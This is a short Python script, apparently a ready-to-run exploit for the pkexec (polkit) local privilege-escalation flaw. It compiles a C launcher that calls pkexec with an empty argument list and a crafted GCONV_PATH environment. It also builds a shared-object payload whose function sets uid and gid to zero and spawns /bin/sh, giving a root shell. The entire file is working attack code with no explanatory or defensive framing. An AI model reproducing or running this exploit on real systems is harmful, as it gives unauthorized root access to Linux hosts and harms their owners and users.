import subprocess, shlex
from os import mkdir

c = """\
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
int main(void) {
char *a_argv[]={ NULL };
char *a_envp[]={
    "kek",
    "PATH=GCONV_PATH=.",
    "LC_MESSAGES=en_US.UTF-8",
    "XAUTHORITY=../LOL",
    NULL
};

printf("[~] compile helper..");
execve("/usr/bin/pkexec", a_argv, a_envp);
}
"""
so_code="""
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    void _() {
      return;
    }
    void shelly() {
      setuid(0); seteuid(0); setgid(0); setegid(0);
      static char *a_argv[] = { "sh", NULL };
      static char *a_envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
      execve("/bin/sh", a_argv, a_envp);
      exit(0);
    }
    """

def main():
    try:
        mkdir("GCONV_PATH=.")
    except FileExistsError as e:
        pass

    fd = open("GCONV_PATH=./lol", 'w')
    fd.close()
    try:
        mkdir('kek')
    except FileExistsError as e:
        pass

    with open('payload.c', 'w') as f:
        f.write(so_code)
    subprocess.run(shlex.split('gcc -o payload.so -shared -fPIC payload.c'))

    f = open('kek/gconv-modules', 'w')
    f.write("module  UTF-8//    INTERNAL    ../payload    2\n")
    f.close()
    ex = open('x.c', 'w')
    ex.write(c)
    ex.close()
    subprocess.run(shlex.split('gcc x.c -o x'))
    subprocess.call('./x', shell=True)

main()
